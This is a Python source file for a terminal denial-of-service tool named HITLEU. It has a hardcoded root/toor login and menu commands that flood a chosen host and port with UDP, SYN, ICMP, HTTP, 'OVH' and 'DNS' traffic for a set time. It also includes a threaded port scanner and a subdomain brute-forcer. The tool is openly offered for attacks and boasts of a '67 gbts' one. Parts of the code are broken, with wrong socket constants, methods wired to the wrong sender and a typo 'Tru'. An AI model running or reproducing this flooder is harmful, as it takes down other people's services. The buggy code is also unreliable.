#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

sys.stdout.write("\x1b]2;H I T L E U ")
def modifications():
	print ("Mysxn EDITED this scare")
	on_enter = input("Please press enter to leave")
	exit()
#column:65
method = """
\033[38;5;93m                                ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
\033[38;5;93m                                ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
\u001b[32m                                ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝			   
\033[38;5;93m             ╔═══════════════════════════════════════════════╗   
\033[38;5;93m             ║ \033[01;37m- - - - - - - - - - \u001b[32mMethods\033[01;37m - - - - - - - - - \033[38;5;93m║
\033[38;5;93m             ║ \033[01;37m- - - - - - - - - - - - - - - - - - - - - - - \033[38;5;93m║
\033[38;5;93m             ╚═══════════════════════════════════════════════╝   
\033[38;5;93m             ╔═════════════════════════╗
\033[38;5;93m             ║Layer [4] <->   layer4   ║                   
\033[38;5;93m             ║Layer [7] <->   layer7   ║
\033[38;5;93m             ║All attacks <-> [ALL]    ║
\033[38;5;93m             ╚═════════════════════════╝
                 Layer [4] Methods
             ╔═════════════════════════╗
             ║ \u001b[32mHttp                    \033[38;5;93m║
             ║ \u001b[32mSyn    \033[01;37mMAIN:\u001b[32mDns        \033[38;5;93m ║
             ║ \u001b[32mOvh                    \033[38;5;93m ║
             ╚═════════════════════════╝
			 Layer [7] Methods
             ╔═════════════════════════╗
             ║ \u001b[32mUdpplain                    \033[38;5;93m║
             ║ \u001b[32mUDPmix    \033[01;37mMAIN:\u001b[32mIcmp        \033[38;5;93m ║
             ║ \u001b[32mUdp                    \033[38;5;93m ║
             ╚═════════════════════════╝

"""

info = """
\033[38;5;93mHIT\u001b[32mLEU\u001b[0m \033[38;5;93m
Made by Mysxn[+] Well i know some skid is going to change this code to there name
orginal name was H I T L E U so have a nice day btw the biggest attack |67 gbts|
"""

version = "3.2"

help = """\u001b[32m
\033[38;5;93m        ╔═══════════════╗        
\033[38;5;93m        ║   \u001b[32mCOMMANDS    \033[38;5;93m║                    
\033[38;5;93m        ╚═══════════════╝
\033[38;5;93m		╔═══════════════════════════════════════════════╗
\033[38;5;93m		║\u001b[32mMethods \033[38;5;93m<-> \u001b[32mshows attack methods               \033[38;5;93m║
\033[38;5;93m		╚════╦═════════════════════════════════════╦════╝
\033[38;5;93m		╔════╩═════════════════════════════════════╩════╗
\033[38;5;93m		║\u001b[32mTools \033[38;5;93m<-> \u001b[32mshows tools                          \033[38;5;93m║
\033[38;5;93m		╚════╦═════════════════════════════════════╦════╝
\033[38;5;93m		╔════╩═════════════════════════════════════╩════╗
\033[38;5;93m		║\u001b[32mInfo \033[38;5;93m<-> \u001b[32mshows info/credits to maker           \033[38;5;93m║
\033[38;5;93m		╚═══════════════════════════════════════════════╝
"""

tools = """\033[91m
//display main header when #H I T L E U  occurs in terminal
\x1b[1;33m                                                
\033[38;5;93m                             ╦ ╦┬┌┬┐┬  ┬ ┬┌─┐                    
\033[38;5;93m                             ╠═╣│ │ │  │ │├┤                     
\u001b[32m                                ╩ ╩┴ ┴ ┴─┘└─┘└─┘                    
\033[38;5;93m             ╔═══════════════════════════════════════════════╗   
\033[38;5;93m             ║\033[01;37m- - - - - - - - - - -\033[38;5;93mMana\033[37m- - - - - - - - - - - \033[38;5;93m║
\033[38;5;93m             ║\033[01;37m- - - - - - \033[38;5;93mMana Ouma \033[38;5;93mIs So \033[38;5;93mAdorable\033[01;37m- - - - -\033[38;5;93m║
\033[38;5;93m             ╚═══════════════════════════════════════════════╝   

\033[38;5;93m ╔══════════════════════════════════════╗   
\033[38;5;93m ║\033[01;37m- - - -\033[38;5;93mType \033[38;5;93mhelp \033[38;5;93mTo Get Started\033[01;37m- - - -\033[38;5;93m║
\033[38;5;93m ╚══════════════════════════════════════╝   
            
"""

updatenotes = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mUPDATE NOTES\033[38;5;93m                     ║
║══════════════════════════════════════════════════════║
║ \033[00m- Better ascii menu\u001b[32m                                  ║
║ \033[00m- Updated command casing no longer only capital\033[38;5;93m      ║
║ \033[00m- Updated attack methods\u001b[32m                             ║
║ \033[00m- Timeout bug fixed\033[38;5;93m                                  ║
║ \033[00m- Background attacks\u001b[32m                                 ║
║ \033[00m- Running task displayer\033[38;5;93m                             ║
║ \033[00m- All tools fixed and working\u001b[32m                        ║
╚══════════════════════════════════════════════════════╝\033[00m

"""
statz = """

║              \033[00mSTATS\u001b[32m                     ║

\033[00m- Attacks: \033[38;5;93m{}                                        
\033[00m- Found Domains: \u001b[32m{}                                  
\033[00m- PINGS: \033[38;5;93m{}                                          
\033[00m- PORTSCANS: \u001b[32m{}                                      
\033[00m- GRABBED IPS: \033[38;5;93m{}                                 
╚══════════════════════════════════════════════════════╝\033[00m"""
banner = """\033[91m
//display main header when #H I T L E U  occurs in terminal
\x1b[1;33m                                                
\033[38;5;93m                             ╦ ╦┬┌┬┐┬  ┬ ┬┌─┐                    
\033[38;5;93m                             ╠═╣│ │ │  │ │├┤                     
\u001b[32m                             ╩ ╩┴ ┴ ┴─┘└─┘└─┘                    
\033[38;5;93m             ╔═══════════════════════════════════════════════╗   
\033[38;5;93m             ║\033[01;37m- - - - - - - - - - -\u001b[32mHITL\033[37m- - - - - - - - - - - \033[38;5;93m║
\033[38;5;93m             ║\033[01;37m- - - - - - \u001b[32mHITLEU || ௹\033[38;5;93mIs So \u001b[32mAdorable\033[01;37m- - - - - \033[38;5;93m║
\033[38;5;93m             ╚═══════════════════════════════════════════════╝   

\033[38;5;93m ╔══════════════════════════════════════╗   
\033[38;5;93m ║\033[01;37m- - - -\033[38;5;93mType \u001b[32mhelp \033[38;5;93mTo Get Started\033[01;37m- - - -\033[38;5;93m║
\033[38;5;93m ╚══════════════════════════════════════╝   
       
"""

altbanner = """\033[91m
//display main header when #H I T L E U  occurs in terminal
\x1b[1;33m                                                
\033[38;5;93m                             ╦ ╦┬┌┬┐┬  ┬ ┬┌─┐                    
\033[38;5;93m                             ╠═╣│ │ │  │ │├┤                     
\u001b[32m                             ╩ ╩┴ ┴ ┴─┘└─┘└─┘                    
\033[38;5;93m             ╔═══════════════════════════════════════════════╗   
\033[38;5;93m             ║\033[01;37m- - - - - - - - - - -\u001b[32mHITL\033[37m- - - - - - - - - - - \033[38;5;93m║
\033[38;5;93m             ║\033[01;37m- - - - - - \u001b[32mHITLEU || ௹\033[38;5;93mIs So \u001b[32mAdorable\033[01;37m- - - - - \033[38;5;93m║
\033[38;5;93m             ╚═══════════════════════════════════════════════╝   

\033[38;5;93m ╔══════════════════════════════════════╗   
\033[38;5;93m ║\033[01;37m- - - -\033[38;5;93mType \u001b[32mhelp \033[38;5;93mTo Get Started\033[01;37m- - - -\033[38;5;93m║
\033[38;5;93m ╚══════════════════════════════════════╝   
       
"""

cookie = open(". H    I     T     L     U    E  ","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True
ovh = True
udp = True
dns = True
udpmix = True
udpplain = True

def sender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1

def ovhsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1
	
def udpplainsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1


def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global http


	while True:
		sys.stdout.write("\x1b]2;௹H I T L E U௹\x07")
		sin = input("\033[38;5;93m╔════════════[\u001b[34;1mサ\033[38;5;93m]\n\033[38;5;93m╚═══\u001b[32mH I T L E U\u001b[34;1m@\033[38;5;93mterminal ~\u001b[34;1m").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (altbanner)
			main()
		elif sinput == "help":
			print (help)	
		elif sinput == "":
			main()
		elif sinput == "exit":
			exit()
		elif sinput == "version":
			print ("rasta version: "+version+" ")
		elif sinput == "stats":
			print ("\033[00m- Attacks: \033[91m{}                                        ".format (tattacks))
			print ("\033[00m- Found Domains: \033[91m{}                                  ".format(fsubs))
			print ("\033[00m- PINGS: \033[91m{}                                          ".format(tpings))
			print ("\033[00m- PORTSCANS: \033[91m{}                                      ".format(pscans))
			print ("\033[00m- GRABBED IPS: \033[91m{}\n                                    ".format(liips))
			main()
		elif sinput == "methods":
			print (method)
			main()
		elif sinput == "info":
			print (info)
			main()
		elif sinput == "portscan":
			port_range = int(sin.split(" ")[2])
			pscans += 1
			def scan(port, ip):
				try:
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock.connect((ip, port))
					print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m {}\033[91m:\033[00m{} [\033[91mOPEN\033[00m]".format (ip, port))
					sock.close()
				except socket.error:
					return
				except KeyboardInterrupt:
					print ("\n")
			for port in range(1, port_range+1):
				ip = socket.gethostbyname(sin.split(" ")[1])
				threading.Thread(target=scan, args=(port, ip)).start()
		elif sinput == "updates":
			print (updatenotes)
			main()
		elif sinput == "info":
			print (info)
			main()
		elif sinput == "attacks":
			print ("\n\033[38;5;93mHIT\u001b[32mLEU\u001b[0m UPD Running processes: {}".format (uaid))
			print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m ICMP Running processes: {}".format (iaid))
			print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m SYN Running processes: {}".format (said))
			print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m Total attacks running: {}\n".format (aid))
			main()
		elif sinput == "dnsresolve":
			sfound = 0
			sys.stdout.write("\x1b]2;S I N F U L L |{}| F O U N D\x07".format (sfound))
			try:
				host = sin.split(" ")[1]
				with open(r"/usr/share/sinfull/subnames.txt", "r") as sub:
					domains = sub.readlines()	
				for link in domains:
					try:
						url = link.strip() + "." + host
						subips = socket.gethostbyname(url)
						print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m Domain: https://{} \033[91m>\033[00m Converted: {} [\033[91mEXISTANT\033[00m]".format(url, subips))
						sfound += 1
						fsubs += 1
						sys.stdout.write("\x1b]2;S I N F U L L |{}| F O U N D\x07".format (sfound))
					except socket.error:
						pass
						#print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m Domain: {} [\033[91mNON-EXISTANT\033[00m]".format(url))
				print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m Task complete | found: {}".format(sfound))
				main()
			except IndexError:
				print ('ADD THE HOST!')
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m Host: {} \033[00m[\033[91mConverted\033[00m] {}".format (host, host_ip))
			main()
		elif sinput == "ping":
			tpings += 1
			try:
				sinput, host, port = sin.split(" ")
				print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m Starting ping on host: {}".format (host))
				try:
					ip = socket.gethostbyname(host)
				except socket.gaierror:
					print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m Host un-resolvable")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(port)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;S I N F U L L |{}ms| D E M O N S\x07".format (stop))
						print ("Sinfull: {}:{} | Time: {}ms [\033[91mUP\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;S I N F U L L |TIME OUT| D E M O N S\x07")
						print ("Sinfull: {}:{} [\033[91mDOWN\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m The command {} requires an argument".format (sinput))
				main()
		elif sinput == "ovh":
			if username == "guests":
				print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack sent to: {}".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m Host: {} invalid".format (host))
					main()
		elif sinput == "udpplain":
			if username == "guests":
				print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack sent to: {}".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m Host: {} invalid".format (host))
					main()
		elif sinput == "udpmix":
			if username == "guests":
				print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack sent to: {}".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m Host: {} invalid".format (host))
					main()
		elif sinput == "dns":
			if username == "guests":
				print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("Attack sent to: {}".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m Host: {} invalid".format (host))
					main()
		elif sinput == "http":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("Attack sent to: {}".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m Host: {} invalid".format (host))
				main()
		elif sinput == "icmp":
			if username == "guests":
				print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m You are not allowed to use this method")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("\u001b[32mAttack \033[38;5;93ms\u001b[32me\033[38;5;93mn\u001b[32mt \u001b[32t\033[38;5;93mo:\033[38;5;93m {}\033[00m".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m The command {} requires an argument".format (sinput))
					main()
				except socket.gaierror:
					print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m Host: {} invalid".format (host))
					main()
		elif sinput == "syn":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("\u001b[32mAttack \033[38;5;93ms\u001b[32me\033[38;5;93mn\u001b[32mt \u001b[32t \033[38;5;93mo:\033[38;5;93m {}\033[00m".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m The command {} requires an argument".format (sinput))
				main()
			except socket.gaierror:
				print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m Host: {} invalid".format (host))
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = Tru
            
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stoping all udp attacks")
				udp = False
				while not udp:
					if aid == 0:
						print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m No udp Processes running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping all icmp attacks")
				icmp = False
				while not icmp:
					print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m No ICMP processes running")
					udp = True
					main()
		else:
			print ("\033[38;5;93mHIT\u001b[32mLEU\u001b[0m {} Not a command".format(sinput))
			main()

try:
	users = ["root", "toor"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("\033[38;5;93m[\u001b[32m+\033[38;5;93m] \u001b[32mUser\033[38;5;93mname (--root--)\033[00m: ")
	if username in users:
		user = username
	else:
		print ("[+] Incorrect, exiting")
		exit()
except KeyboardInterrupt:
	print ("\nCTRL-C Pressed")
	exit()
try:
	passwords = ["root", "toor"]
	password = getpass.getpass ("\033[38;5;93m[\u001b[32m+\033[38;5;93m] \u001b[32mPass\033[38;5;93mword (--root--)\033[00m: ")
	if user == "root":
		if password == passwords[0]:
			print ("[+] Login correct")
			cookie.write("DIE")
			time.sleep(2)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n\033[38;5;93mHIT\u001b[32mLEU\u001b[0m CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
	if user == "guests":
		if password == passwords[1]:
			print ("[+] Login correct")
			print ("[+] Certain methods will not be available to you")
			time.sleep(4)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n\033[38;5;93mHIT\u001b[32mLEU\u001b[0m CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
except KeyboardInterrupt:
	exit()